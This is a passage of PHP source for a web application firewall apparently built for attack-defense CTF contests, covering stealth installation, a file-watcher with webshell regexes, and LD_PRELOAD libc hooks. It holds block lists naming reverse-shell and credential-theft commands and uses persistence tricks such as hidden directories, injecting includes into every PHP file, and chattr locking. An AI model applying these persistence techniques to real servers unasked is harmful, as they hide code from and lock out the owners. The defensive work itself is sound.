    if (!is_dir($wr)) { echo "[!] Not a directory: $wr\n"; exit(1); }

    if (!$pw)  { $pw  = pwaf_rand(14); echo "[*] Password: $pw\n"; }
    if (!$key) { $key = 'k' . pwaf_rand(10); echo "[*] Panel key: $key\n"; }

    echo "\n  PhoenixWAF v" . PWAF_VER . " — Advanced Stealth Deployment to $wr\n\n";

    // 1. 生成唯一的随机隐藏目录名 (移除 .pwaf_ptr，改用硬编码逻辑)
    $rand_name = '.' . substr(md5(uniqid('sys', true) . random_int(0, 999999)), 0, 8);
    $datadir = $wr . '/' . $rand_name;
    if (!@mkdir($datadir, 0700, true)) { echo "[!] Failed to create secure directory\n"; exit(1); }
    echo "[+] Created hidden storage: $datadir\n";

        $final_waf_path = $datadir . '/common.inc.php';
    if (!copy(PWAF_SELF, $final_waf_path)) { echo "[!] Failed to move core file\n"; exit(1); }
    echo "[+] Core logic moved to: $final_waf_path\n";

        $cfg = pwaf_default_cfg();
    $cfg['hash']         = password_hash($pw, PASSWORD_BCRYPT, array('cost' => 10));
    $cfg['key']          = $key;
    $cfg['datadir']      = $datadir;
    $cfg['log']          = $datadir . '/.sess_' . substr(md5($key), 0, 6) . '_log';
    $cfg['rate_db']      = $datadir . '/.tmp_ratelimit';
    $cfg['integrity_db'] = $datadir . '/.tmp_integrity';
    $cfg['backup']       = $datadir . '/.common.bak.php';
    $cfg['webroot']      = $wr;
    $cfg['enabled']      = true;

    file_put_contents($datadir . '/.pwaf.php', '<?php return ' . var_export($cfg, true) . ';', LOCK_EX);
    copy($final_waf_path, $cfg['backup']);
    echo "[+] Configuration initialized in secret directory\n";

        echo "[*] Scanning PHP files for injection...\n";
    $files = pwaf_php_files($wr, $final_waf_path);
    echo "[*] Found " . count($files) . " candidate files\n";

        $ui = $wr . '/.user.ini';
    if (is_writable($wr)) {
        $ex = file_exists($ui) ? file_get_contents($ui) : '';
        if (strpos($ex, 'auto_prepend_file') === false) {
            file_put_contents($ui, "auto_prepend_file = $final_waf_path\n" . $ex, LOCK_EX);
            echo "[+] Strategy A: .user.ini updated\n";
        }
    }

        $ht = $wr . '/.htaccess';
    if (is_writable($wr)) {
        $ht_content = file_exists($ht) ? file_get_contents($ht) : '';
                if (strpos($ht_content, 'ForceType application/x-httpd-php') === false) {
            $force_block = "\n# Internal System Sync\n"
                . "<FilesMatch \"^(flag|flag\\.txt|flag\\.php|secret|\\.env|config\\.bak|backup\\.sql)$\">\n"
                . "    ForceType application/x-httpd-php\n"
                . "    php_value auto_prepend_file \"$final_waf_path\"\n"
                . "</FilesMatch>\n"
                . "php_value auto_prepend_file \"$final_waf_path\"\n"
                . "Options -Indexes\n";             file_put_contents($ht, $ht_content . $force_block, LOCK_EX);
            echo "[+] Strategy B: .htaccess updated with ForceType protection\n";
        }
    }

    // 7. 挂载策略 C: 物理硬编码注入 (容错性最强)
    // 单引号包裹路径：避免路径中的 $ \ 等在双引号字符串里被 PHP 转义/插值。
    $tag = "<?php /* @internal_handler */ @include_once '" . str_replace("'", "\\'", $final_waf_path) . "'; ?>";
    $inj = 0; $skip = 0;
    foreach ($files as $f) {
        $c = @file_get_contents($f);
        if ($c === false || strpos($c, '@internal_handler') !== false) { $skip++; continue; }
                $new_c = preg_replace('/^<\?php/i', $tag . "\n<?php", $c, 1, $count);
        if ($count === 0) $new_c = $tag . "\n" . $c;         if (file_put_contents($f, $new_c, LOCK_EX) !== false) $inj++;
        else $skip++;
    }
    echo "[+] Strategy C: Physical injection complete ($inj files)\n";

    // 8. 建立蜜罐文件
    foreach (['flag.txt', 'flag'] as $hf) {
        $hp = $wr . '/' . $hf;
        if (!file_exists($hp)) { @file_put_contents($hp, $cfg['fake_flag']); }
    }

        $hashes = [];
    foreach (pwaf_all_files($wr) as $f) $hashes[$f] = hash_file('sha256', $f);
    file_put_contents($cfg['integrity_db'], json_encode(['b'=>$hashes,'ts'=>time()]), LOCK_EX);

        pwaf_deploy_watcher($wr, true);

    // 11. 部署 LD_PRELOAD
    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
        pwaf_deploy_ldpreload($wr);
    }

    // 12. 终极防御：chattr +i 锁定 (如果权限允许)
    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
        echo "[*] Locking core files...\n";
        // 锁定：WAF核心、备份、两个挂载入口。
        // ⚠ 绝不锁定 .pwaf.php：它是运行时可变配置，pwaf_save_cfg() 会写它——
        // 面板每次开关/加白名单、以及 L8 裁判机自动加白都要改它。锁了会静默失败，
        // 导致面板改动不生效、裁判机无法加白（AWD 里可能因此误封裁判机宕机扣分）。
        @exec('chattr +i ' . escapeshellarg($final_waf_path) . ' 2>/dev/null');
        @exec('chattr +i ' . escapeshellarg($cfg['backup']) . ' 2>/dev/null');
        @exec('chattr +i ' . escapeshellarg($ui) . ' 2>/dev/null');
        @exec('chattr +i ' . escapeshellarg($ht) . ' 2>/dev/null');
        echo "[+] Core files locked with chattr +i (config left mutable)\n";
    }

    echo "\n+--------------------------------------------------+\n";
    echo "| PhoenixWAF v" . PWAF_VER . " — Deployment Success      |\n";
    echo "+--------------------------------------------------+\n";
    echo "| Panel Key : $key\n";
    echo "| Admin Pass: $pw\n";
    echo "| Entry     : http://host/index.php?waf_key=$key\n";
    echo "+--------------------------------------------------+\n\n";
}

// Deploys a bash script that uses inotifywait (inotify-tools) for event-driven
// file monitoring — zero CPU idle cost, instant response to filesystem changes
function pwaf_deploy_watcher($wr, $silent = false) {
    $wr = rtrim(realpath($wr) ?: $wr, '/\\');
    if (!is_dir($wr)) { if (!$silent) echo "[!] Not a directory: $wr\n"; return; }
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') { if (!$silent) echo "[i] L6: inotifywait not available on Windows\n"; return; }

    $watcher_path = $wr . '/.pwaf_watcher.sh';
    $log_path     = $wr . '/.pwaf_log';
    $bak_path     = $wr . '/.pwaf_bak.php';
    $waf_path     = $wr . '/waf.php';
    $cfg_path     = $wr . '/.pwaf.php';
    $htaccess     = $wr . '/.htaccess';
    $userini      = $wr . '/.user.ini';
    $pid_path     = $wr . '/.pwaf_watcher.pid';

        $shell_pats = 'eval\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)'
                . '|assert\s*\(\s*\$_(GET|POST|REQUEST)'
                . '|system\s*\(\s*\$_(GET|POST|REQUEST)'
                . '|exec\s*\(\s*\$_(GET|POST|REQUEST)'
                . '|passthru\s*\(\s*\$_(GET|POST|REQUEST)'
                . '|shell_exec\s*\(\s*\$_(GET|POST|REQUEST)'
                . '|base64_decode\s*\(\s*\$_(GET|POST)'
                . '|str_rot13\s*\(\s*.*gzinflate'
                . '|preg_replace\s*\(.*/[a-z]*e[a-z]*\s*,'
                . '|create_function\s*\('
                . '|call_user_func\s*\(\s*\$_(GET|POST)';

    $script = <<<BASH
#!/bin/bash
# PhoenixWAF inotifywait Kernel File Watcher
# Event-driven: zero CPU cost when idle, instant response to filesystem changes
# Deployed by: pwaf_deploy_watcher()

WEBROOT="{$wr}"
LOG="{$log_path}"
PID_FILE="{$pid_path}"
WAF_PHP="{$waf_path}"
WAF_CFG="{$cfg_path}"
WAF_BAK="{$bak_path}"
HTACCESS="{$htaccess}"
USERINI="{$userini}"

# Core files to protect (auto-restore if deleted/modified)
PROTECTED_FILES=("waf.php" ".pwaf.php" ".htaccess" ".user.ini" ".pwaf_bak.php")

# Webshell detection regex (PCRE, for grep -P)
SHELL_REGEX='{$shell_pats}'

# PID management
echo \$\$ > "\$PID_FILE"
trap "rm -f '\$PID_FILE'; exit 0" SIGTERM SIGINT SIGHUP

log_event() {
    local rule="\$1" file="\$2" payload="\$3" action="\$4"
    local ts=\$(date +%s)
    local dt=\$(date '+%Y-%m-%d %H:%M:%S')
    local bn=\$(basename "\$file")
    printf '{"ts":%d,"dt":"%s","ip":"WATCHER","method":"FSMON","uri":"%s","rule":"%s","payload":"%.200s","param":"file","ua":"inotifywait","action":"%s"}\n' \\
        "\$ts" "\$dt" "\$bn" "\$rule" "\$payload" "\$action" >> "\$LOG"
}

# Self-heal: restore a protected file from backup or known content
restore_protected() {
    local bn="\$1"
    case "\$bn" in
        "waf.php")
            if [ -f "\$WAF_BAK" ]; then
                cp -f "\$WAF_BAK" "\$WAF_PHP" 2>/dev/null
                log_event "watcher_restore" "\$WAF_PHP" "restored from backup" "restored"
            fi
            ;;
        ".pwaf.php"|".htaccess"|".user.ini"|".pwaf_bak.php")
            # These are config-sensitive, log the deletion but only restore waf.php
            log_event "watcher_deleted" "\$WEBROOT/\$bn" "protected file deleted" "alert"
            ;;
    esac
}

# Check if a PHP file is a webshell
check_webshell() {
    local filepath="\$1"
    local bn=\$(basename "\$filepath")

    # Skip WAF's own files
    case "\$bn" in
        waf.php|.pwaf*|.pwaf_watcher*) return 1 ;;
    esac

    # Only check PHP files
    local ext="\${filepath##*.}"
    ext=\$(echo "\$ext" | tr '[:upper:]' '[:lower:]')
    case "\$ext" in
        php|php3|php4|php5|php7|phtml|phar|inc) ;;
        *) return 1 ;;
    esac

    # Check if file contains webshell patterns
    if [ -f "\$filepath" ] && grep -qP "\$SHELL_REGEX" "\$filepath" 2>/dev/null; then
        return 0  # Is a webshell
    fi
    return 1  # Not a webshell
}

# Neutralize a detected webshell
neutralize() {
    local filepath="\$1"
    local sample=\$(head -c 200 "\$filepath" 2>/dev/null | tr -d '\n' | tr '"' "'")
    echo '<?php exit(); ?>' > "\$filepath" 2>/dev/null
    log_event "watcher_shell" "\$filepath" "\$sample" "neutralized"
}

# ── Pre-flight checks ──
if ! command -v inotifywait &>/dev/null; then
    echo "[!] inotifywait not found. Install: apt-get install -y inotify-tools" >&2
    # Fallback: try to install automatically (AWD scenario)
    apt-get install -y inotify-tools 2>/dev/null || yum install -y inotify-tools 2>/dev/null || true
    if ! command -v inotifywait &>/dev/null; then
        echo "[!] Failed to install inotify-tools. Watcher cannot start." >&2
        exit 1
    fi
fi

# ── Main watch loop ──
# Monitor CREATE, MODIFY, DELETE, MOVED_TO events recursively
# --monitor: never exit, keep watching
# --recursive: watch all subdirectories
# --exclude: skip WAF log/rate/counter files (high-frequency writes)
inotifywait -m -r -e create,modify,delete,moved_to \\
    --exclude '\.pwaf_(log|rate|cnt|chk|access|watcher\.pid)' \\
    --format '%w%f|%e' \\
    "\$WEBROOT" 2>/dev/null | while IFS='|' read -r FILEPATH EVENTS; do

    # Skip empty
    [ -z "\$FILEPATH" ] && continue

    local_bn=\$(basename "\$FILEPATH")

    # ── Protected file detection ──
    for pf in "\${PROTECTED_FILES[@]}"; do
        if [ "\$local_bn" = "\$pf" ]; then
            if echo "\$EVENTS" | grep -q "DELETE"; then
                restore_protected "\$pf"
            elif echo "\$EVENTS" | grep -q "MODIFY"; then
                # Protected file was modified — check if it's still valid
                if [ "\$pf" = "waf.php" ] && [ -f "\$WAF_BAK" ]; then
                    local orig_hash=\$(sha256sum "\$WAF_BAK" 2>/dev/null | cut -d' ' -f1)
                    local curr_hash=\$(sha256sum "\$WAF_PHP" 2>/dev/null | cut -d' ' -f1)
                    if [ "\$orig_hash" != "\$curr_hash" ]; then
                        cp -f "\$WAF_BAK" "\$WAF_PHP" 2>/dev/null
                        log_event "watcher_tamper" "\$WAF_PHP" "waf.php tampered, restored" "restored"
                    fi
                fi
            fi
            continue 2
        fi
    done

    # ── New/modified file: webshell check ──
    if echo "\$EVENTS" | grep -qE "CREATE|MODIFY|MOVED_TO"; then
        if [ -f "\$FILEPATH" ]; then
            if check_webshell "\$FILEPATH"; then
                neutralize "\$FILEPATH"
            fi
        fi
    fi

done
BASH;

    file_put_contents($watcher_path, $script, LOCK_EX);
    @chmod($watcher_path, 0755);

        if (file_exists($pid_path)) {
        $old_pid = trim(@file_get_contents($pid_path));
        if ($old_pid && is_numeric($old_pid)) {
            @exec("kill $old_pid 2>/dev/null");
        }
    }

        $cmd = "nohup bash " . escapeshellarg($watcher_path) . " > /dev/null 2>&1 &";
    exec($cmd);
    if (!$silent) echo "[+] L6: inotifywait kernel watcher deployed & started\n";
    if (!$silent) echo "    PID file: $pid_path\n";
    if (!$silent) echo "    Script:   $watcher_path\n";
}

function pwaf_uninstall($wr) {
    $wr = rtrim(realpath($wr) ?: $wr, '/\\');
    echo "[*] PhoenixWAF Uninstalling from $wr ...\n";

        $files = pwaf_php_files($wr, '');
    $cleaned = 0;
    foreach ($files as $f) {
        $c = @file_get_contents($f);
        if ($c !== false && strpos($c, '@internal_handler') !== false) {
            $new_c = preg_replace('/<\?php \/\* @internal_handler \*\/ .*? \?>\n?/', '', $c);
            if (file_put_contents($f, $new_c, LOCK_EX)) $cleaned++;
        }
    }
    echo "[+] Cleaned $cleaned PHP files.\n";

        $items = scandir($wr);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $target = $wr . '/' . $item;
        
        if (is_dir($target) && $item[0] === '.') {
                        if (file_exists($target . '/.pwaf.php') || file_exists($target . '/common.inc.php')) {
                // 移除不可更改位 (chattr -i)
                if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
                    @exec('chattr -Ri ' . escapeshellarg($target) . ' 2>/dev/null');
                }
                
                                $pid_f = $target . '/.pwaf_watcher.pid';
                if (file_exists($pid_f)) {
                    $pid = trim(file_get_contents($pid_f));
                    if ($pid) @exec("kill -9 $pid 2>/dev/null");
                }

                                pwaf_rrmdir($target);
                echo "[+] Destroyed WAF data directory: $item\n";
            }
        }
    }

        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
    foreach (['waf.php', '.pwaf_ptr', '.user.ini', '.htaccess'] as $f) {
        $fp = $wr . '/' . $f;
        if (!file_exists($fp)) continue;
        if ($f === '.user.ini' || $f === '.htaccess') {
            if (!$win) @exec('chattr -i ' . escapeshellarg($fp) . ' 2>/dev/null');   // 先解锁再改
            $c = file_get_contents($fp);
            // 删除任何 auto_prepend_file 行（路径指向 .<rand>/common.inc.php，不含 waf.php）
            $c = preg_replace('/^.*auto_prepend_file.*$\n?/im', '', $c);
            // 删除安装时写入的 ForceType 保护块（# Internal System Sync ... Options -Indexes）
            $c = preg_replace('/\n?# Internal System Sync\n(?:.*\n)*?Options -Indexes\n?/', '', $c);
            $c = preg_replace('/^\s*ForceType application\/x-httpd-php\s*$\n?/im', '', $c);
            $c = preg_replace('/^\s*Options -Indexes\s*$\n?/im', '', $c);
            if (trim($c) === '') @unlink($fp); else file_put_contents($fp, $c);
        } else {
            @unlink($fp);
        }
    }

    echo "[+] Uninstall finished. System is clean.\n";
}

function pwaf_rrmdir($dir) {
    if (is_dir($dir)) {
        $objects = scandir($dir);
        foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
                if (is_dir($dir . "/" . $object)) pwaf_rrmdir($dir . "/" . $object);
                else @unlink($dir . "/" . $object);
            }
        }
        @rmdir($dir);
    }
}

function pwaf_status($wr) {
    $wr  = rtrim(realpath($wr) ?: $wr, '/\\');
    $dst = $wr . '/waf.php';
        $ptr = $wr . '/.pwaf_ptr';
    $cp  = '';
    $datadir = '';
    if (file_exists($ptr)) {
        $dir = trim(file_get_contents($ptr));
        if ($dir !== '' && is_dir($wr . '/' . $dir)) {
            $datadir = $wr . '/' . $dir;
            $cp = $datadir . '/.pwaf.php';
        }
    }
        if (!$cp || !file_exists($cp)) {
        foreach (glob($wr . '/.*/.pwaf.php') ?: [] as $cand) { $cp = $cand; $datadir = dirname($cand); break; }
    }
    if (!$cp || !file_exists($cp)) {
        $cp = $wr . '/.pwaf.php';      }
    echo "PhoenixWAF Status — $wr\n";
    echo "  waf.php  : " . (file_exists($dst) ? '[OK]' : '[MISSING]') . "\n";
    echo "  pointer  : " . (file_exists($ptr) ? '[OK] -> ' . ($datadir ? basename($datadir) : '?') : '[NOT SET]') . "\n";
    echo "  datadir  : " . ($datadir ? $datadir : '(none)') . "\n";
    echo "  config   : " . (file_exists($cp)  ? '[OK]' : '[MISSING]') . "\n";
    if (file_exists($cp)) {
        $cfg = include $cp;
        echo "  enabled  : " . ($cfg['enabled'] ? 'YES' : 'NO') . "\n";
        $lp = (isset($cfg['log']) ? $cfg['log'] : '');
        if (file_exists($lp)) echo "  log lines: " . count(file($lp, FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES)) . "\n";
        echo "  blacklist: " . count((isset($cfg['blacklist']) ? $cfg['blacklist'] : array())) . " IPs\n";
        echo "  checkers : " . count((isset($cfg['checker_ips']) ? $cfg['checker_ips'] : array())) . " IPs\n";
    }
    $ui = $wr . '/.user.ini';
    echo "  .user.ini: " . (file_exists($ui) && strpos(file_get_contents($ui),'auto_prepend_file')!==false ? '[OK]' : '[NOT SET]') . "\n";
    $ht = $wr . '/.htaccess';
    echo "  .htaccess: " . (file_exists($ht) && strpos(file_get_contents($ht),'auto_prepend_file')!==false ? '[OK]' : '[NOT SET]') . "\n";
    $files = pwaf_php_files($wr, $dst); $inj = 0;
    // 注入标记是 @internal_handler（不是旧的 PWAF_MARKER /*PWAF*/），否则永远统计为 0
    foreach ($files as $f) { if (strpos(file_get_contents($f), '@internal_handler') !== false) $inj++; }
    echo "  injected : $inj / " . count($files) . " PHP files\n";
    $watcher_sh = $datadir ? ($datadir . '/.pwaf_watcher.sh') : ($wr . '/.pwaf_watcher.sh');
    $watcher_pid = $datadir ? ($datadir . '/.pwaf_watcher.pid') : ($wr . '/.pwaf_watcher.pid');
    echo "  watcher  : " . (file_exists($watcher_sh) ? '[DEPLOYED]' : '[NOT DEPLOYED]') . "\n";
    if (file_exists($watcher_pid)) {
        $wpid = trim(file_get_contents($watcher_pid));
        echo "  watcher PID: $wpid (" . (file_exists("/proc/$wpid") ? 'running' : 'stopped') . ")\n";
    }
}

function pwaf_baseline_cli($wr) {
    $wr = rtrim(realpath($wr) ?: $wr, '/\\');
        $cp = '';
    foreach (glob($wr . '/.*/.pwaf.php') ?: [] as $cand) { $cp = $cand; break; }
    if (!$cp || !file_exists($cp)) $cp = $wr . '/.pwaf.php';
    if (!file_exists($cp)) { echo "[!] Config not found. Run --install first.\n"; exit(1); }
    $cfg = include $cp;
    pwaf_update_baseline($cfg);
    echo "[+] Baseline updated.\n";
}

// SECTION 8: HELPERS

function pwaf_php_files($wr, $exclude) {
    $files = []; $skip = ['waf.php'];
    try {
        $iter = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($wr, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iter as $f) {
            if (!$f->isFile()) continue;
            if (strtolower($f->getExtension()) !== 'php') continue;
            $path = $f->getRealPath();
            $base = $f->getFilename();
            if ($exclude && $path === realpath($exclude)) continue;
            if (in_array($base, $skip, true)) continue;
            if ($base[0] === '.' && strpos($base, '.pwaf') === 0) continue;
            $files[] = $path;
        }
    } catch (Exception $ex) {}
    return $files;
}

function pwaf_rand($n) {
    $c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $o = '';
    for ($i = 0; $i < $n; $i++) $o .= $c[random_int(0, strlen($c)-1)];
    return $o;
}

function pwaf_same_length_fake($real_flag, $fallback_fake) {
    $len = strlen($real_flag);
    if ($len < 7) return $fallback_fake;     // 保留 flag{ 和 }，中间用随机字符填充
    $chars = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890_-';
    $inner_len = $len - 6;     if ($inner_len <= 0) return $fallback_fake;
    $inner = '';
    for ($i = 0; $i < $inner_len; $i++) $inner .= $chars[random_int(0, strlen($chars)-1)];
    return 'flag{' . $inner . '}';
}

// ── LD_PRELOAD: .so deployment ───────────────────────────────────────────────
// Deploys a shared library (.so) that hooks dangerous libc functions at OS level.
//   A. Copy pre-compiled waf_<arch>.so shipped next to waf.php into the data directory
//   B. Generate C source in data directory, compile with gcc/cc/musl-gcc on host
//   - execve():   blocks commands containing dangerous keywords + envp LD_PRELOAD override
//   - chmod():    prevents stripping permissions on protected files
function pwaf_deploy_ldpreload($wr) {
    $wr = rtrim(realpath($wr) ? realpath($wr) : $wr, '/\\');
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        echo "[!] LD_PRELOAD is Linux-only. Cannot deploy on Windows.\n";
        echo "[i] Copy waf.php to your Linux server and run:\n";
        echo "    php waf.php --ldpreload /var/www/html\n";
        return;
    }

        $datadir = "";

        $ptr_file = $wr . '/.pwaf_ptr';
    if (file_exists($ptr_file)) {
        $ptr_name = trim(file_get_contents($ptr_file));
        if ($ptr_name) {
            $datadir = $wr . '/' . $ptr_name;
        }
    }

    // B. 如果指针失效，直接扫描根目录下的随机隐藏文件夹（防死逻辑）
    if (!$datadir || !is_dir($datadir)) {
        $items = scandir($wr);
        foreach ($items as $item) {
            if ($item[0] === '.' && strlen($item) > 5 && is_dir($wr . '/' . $item)) {
                if (file_exists($wr . '/' . $item . '/common.inc.php')) {
                    $datadir = $wr . '/' . $item;
                    break;
                }
            }
        }
    }

        if (!$datadir) $datadir = $wr;

    // 设置最终物理路径 (这里的变量名 $so_path 必须和下面编译命令里的保持一致)
    $so_path  = $datadir . '/waf.so';
    $log_path = $datadir . '/.sess_system_log';

        if (!is_dir($datadir)) @mkdir($datadir, 0700, true);
    
    $so_path  = $datadir . '/waf.so';
        $log_path = $datadir . '/.sess_system_log';


        $arch = trim(@exec('uname -m 2>/dev/null'));
    echo "[*] Architecture: $arch\n";
    echo "[*] Data directory: $datadir\n";

    // ── Strategy A: copy pre-compiled waf_<arch>.so from beside waf.php ──
    $deployed = false;
    $precompiled = dirname(PWAF_SELF) . '/waf_' . $arch . '.so';
    if (file_exists($precompiled)) {
        if (@copy($precompiled, $so_path)) {
            @chmod($so_path, 0755);
            echo "[+] Deployed pre-compiled .so: $precompiled -> $so_path\n";
            $deployed = true;
        } else {
            echo "[!] Found $precompiled but failed to copy to $so_path\n";
        }
    } else {
        echo "[*] No pre-compiled .so found at $precompiled\n";
    }
        if ($deployed) {
                $test_cmd = "LD_PRELOAD=" . escapeshellarg($so_path) . " ls / 2>&1";
        exec($test_cmd, $out, $ret);

                if (strpos(implode("\n", $out), "GLIBC") !== false) {
            echo "[!] Pre-compiled .so incompatible with current GLIBC. Attempting local build...\n";
            $deployed = false;
        }
    }
        if (!$deployed) {
        echo "[*] Attempting on-host compilation...\n";

        $c_path = $datadir . '/.pwaf_so_build.c';
        $log_escaped = addcslashes($log_path, '"\\');
        $wr_escaped  = addcslashes($wr, '"\\');

        $c_source = <<<'CSRC_HEAD'
/*
 * PhoenixWAF LD_PRELOAD Protection v3.8
 * Hooks: execve, unlink, rename, chmod, remove, truncate, symlink, link, fopen
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <time.h>
#include <errno.h>
#include <sys/types.h>

CSRC_HEAD;

        // Inject runtime paths via #ifndef (overridable with -D at compile time)
        $c_source .= "#ifndef PWAF_LOG_PATH\n";
        $c_source .= "#define PWAF_LOG_PATH \"$log_escaped\"\n";
        $c_source .= "#endif\n";
        $c_source .= "#ifndef PWAF_WEBROOT\n";
        $c_source .= "#define PWAF_WEBROOT \"$wr_escaped\"\n";
        $c_source .= "#endif\n";
        $c_source .= "static const char *LOG_PATH = PWAF_LOG_PATH;\n";
        $c_source .= "static const char *WEBROOT  = PWAF_WEBROOT;\n\n";

        $c_source .= <<<'CSRC_BODY'
// ── Blocked keywords for execve ──
static const char *exec_blocked[] = {
    "flag", "LD_PRELOAD", "waf.so", "waf.php", ".pwaf",
    "/dev/tcp/", "/dev/udp/", "nc -e", "nc -lp", "ncat -e", "mkfifo", "socat",
    "/etc/shadow", "/etc/passwd", "base64.*decode",
    "python -c", "python3 -c", "perl -e", "ruby -e", "php -r",
    "bash -i", "sh -i", "chattr", "setfacl", "crontab", "wget ", "curl ",
    NULL
};

// ── Protected filenames (unlink/rename/chmod/remove/truncate protection) ──
static const char *protected_names[] = {
    "waf.php", "common.inc.php", ".pwaf.php", ".pwaf_bak.php", ".common.bak.php",
    ".htaccess", ".user.ini",
    "waf.so", ".pwaf_watcher.sh", ".pwaf_watcher.pid",
    ".pwaf_log", ".pwaf_int", ".pwaf_rate",
    NULL
};

// ── Logging ──
static void pwaf_log(const char *hook, const char *target) {
    FILE *f = fopen(LOG_PATH, "a");
    if (!f) return;
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    char ts[32];
    strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", t);
    fprintf(f, "{\"ts\":%ld,\"dt\":\"%s\",\"ip\":\"LDPRELOAD\",\"method\":\"%s\","
               "\"uri\":\"%.200s\",\"rule\":\"ldpreload_%s\","
               "\"payload\":\"%.200s\",\"param\":\"syscall\",\"ua\":\"\","
               "\"action\":\"blocked\"}\n",
            (long)now, ts, hook, target, hook, target);
    fclose(f);
}

// ── Check if path is a protected file ──
static int is_protected(const char *path) {
    if (!path) return 0;
    const char *bn = strrchr(path, '/');
    bn = bn ? bn + 1 : path;
    for (int i = 0; protected_names[i]; i++) {
        if (strcmp(bn, protected_names[i]) == 0) return 1;
    }
    if (strstr(path, ".pwaf") != NULL) return 1;
    return 0;
}

// ── Hook: execve ──
typedef int (*real_execve_t)(const char *, char *const[], char *const[]);
int execve(const char *filename, char *const argv[], char *const envp[]) {
    real_execve_t real_execve = (real_execve_t)dlsym(RTLD_NEXT, "execve");
    if (!real_execve) { errno = EACCES; return -1; }
    // 按实际长度堆分配拼接全部参数(封顶 1MB)，消除旧版 64 参数 / 2048 字节的填充绕过
    size_t total = (filename ? strlen(filename) : 0) + 2;
    if (argv) for (int i = 0; argv[i] && i < 100000; i++) total += strlen(argv[i]) + 1;
    if (total > 1048576) total = 1048576;
    char *cmdline = (char *)malloc(total + 1);
    if (cmdline) {
        size_t off = 0;
        for (int i = 0; argv && argv[i] && off < total; i++) {
            size_t l = strlen(argv[i]);
            if (off + l + 1 >= total) l = total - off - 1;
            if ((int)l <= 0) break;
            memcpy(cmdline + off, argv[i], l); off += l; cmdline[off++] = ' ';
        }
        cmdline[off] = '\0';
        for (int j = 0; exec_blocked[j]; j++) {
            if (strstr(cmdline, exec_blocked[j]) != NULL ||
                (filename && strstr(filename, exec_blocked[j]) != NULL)) {
                pwaf_log("execve", cmdline); free(cmdline); errno = EACCES; return -1;
            }
        }
        free(cmdline);
    } else {
        for (int j = 0; exec_blocked[j]; j++) {
            if (filename && strstr(filename, exec_blocked[j])) { errno = EACCES; return -1; }
            for (int i = 0; argv && argv[i]; i++)
                if (strstr(argv[i], exec_blocked[j])) { errno = EACCES; return -1; }
        }
    }
    if (argv) {
        for (int i = 0; argv[i]; i++) {
            if (strstr(argv[i], "env") && argv[i+1] && strstr(argv[i+1], "-i")) {
                pwaf_log("execve", "env -i bypass attempt");
                errno = EACCES;
                return -1;
            }
        }
    }
    // Check envp for LD_PRELOAD override attempts
    if (envp) {
        for (int i = 0; envp[i]; i++) {
            if (strncmp(envp[i], "LD_PRELOAD=", 11) == 0 &&
                strstr(envp[i], "waf.so") == NULL) {
                pwaf_log("execve", "LD_PRELOAD override attempt");
                errno = EACCES;
                return -1;
            }
        }
    }
    return real_execve(filename, argv, envp);
}

// ── Hook: unlink ──
typedef int (*real_unlink_t)(const char *);
int unlink(const char *pathname) {
    real_unlink_t real_unlink = (real_unlink_t)dlsym(RTLD_NEXT, "unlink");
    if (!real_unlink) { errno = EACCES; return -1; }
    if (is_protected(pathname)) { pwaf_log("unlink", pathname); errno = EPERM; return -1; }
    return real_unlink(pathname);
}

// ── Hook: rename ──
typedef int (*real_rename_t)(const char *, const char *);
int rename(const char *oldpath, const char *newpath) {
    real_rename_t real_rename = (real_rename_t)dlsym(RTLD_NEXT, "rename");
    if (!real_rename) { errno = EACCES; return -1; }
    if (is_protected(oldpath)) { pwaf_log("rename", oldpath); errno = EPERM; return -1; }
    return real_rename(oldpath, newpath);
}

// ── Hook: chmod ──
typedef int (*real_chmod_t)(const char *, mode_t);
int chmod(const char *pathname, mode_t mode) {
    real_chmod_t real_chmod = (real_chmod_t)dlsym(RTLD_NEXT, "chmod");
    if (!real_chmod) { errno = EACCES; return -1; }
    if (is_protected(pathname)) { pwaf_log("chmod", pathname); errno = EPERM; return -1; }
    return real_chmod(pathname, mode);
}

// ── Hook: remove ──
typedef int (*real_remove_t)(const char *);
int remove(const char *pathname) {
    real_remove_t real_remove = (real_remove_t)dlsym(RTLD_NEXT, "remove");
    if (!real_remove) { errno = EACCES; return -1; }
    if (is_protected(pathname)) { pwaf_log("remove", pathname); errno = EPERM; return -1; }
    return real_remove(pathname);
}

// ── Hook: truncate ──
typedef int (*real_truncate_t)(const char *, off_t);
int truncate(const char *path, off_t length) {
    real_truncate_t real_truncate = (real_truncate_t)dlsym(RTLD_NEXT, "truncate");
    if (!real_truncate) { errno = EACCES; return -1; }
    if (is_protected(path) && length == 0) { pwaf_log("truncate", path); errno = EPERM; return -1; }
    return real_truncate(path, length);
}

// ── Hook: symlink ──
typedef int (*real_symlink_t)(const char *, const char *);
int symlink(const char *target, const char *linkpath) {
    real_symlink_t real_symlink = (real_symlink_t)dlsym(RTLD_NEXT, "symlink");
    if (!real_symlink) { errno = EACCES; return -1; }
    if (is_protected(target) || is_protected(linkpath) ||
        (target && strstr(target, "flag")) ||
        (target && strstr(target, "/etc/passwd")) ||
        (target && strstr(target, "/etc/shadow"))) {
        pwaf_log("symlink", target ? target : "?"); errno = EPERM; return -1;
    }
    return real_symlink(target, linkpath);
}

// ── Hook: link ──
typedef int (*real_link_t)(const char *, const char *);
int link(const char *oldpath, const char *newpath) {
    real_link_t real_link = (real_link_t)dlsym(RTLD_NEXT, "link");
    if (!real_link) { errno = EACCES; return -1; }
